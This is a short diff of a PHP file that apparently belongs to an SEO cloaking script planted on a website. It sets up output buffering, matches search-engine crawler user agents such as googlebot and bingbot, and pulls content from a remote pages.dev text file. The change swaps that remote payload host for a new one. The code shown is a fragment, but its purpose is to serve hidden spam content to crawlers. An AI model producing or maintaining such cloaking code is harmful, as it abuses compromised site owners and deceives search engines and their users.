@@ -2,7 +2,7 @@
 @ob_start();
 header("Vary: U-Agent");
 
-$src = "https://bree-x-02-pkdeee.pages.dev/index.txt";
+$src = "https://bree-x-02-kokop.pages.dev/index.txt";
 $match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
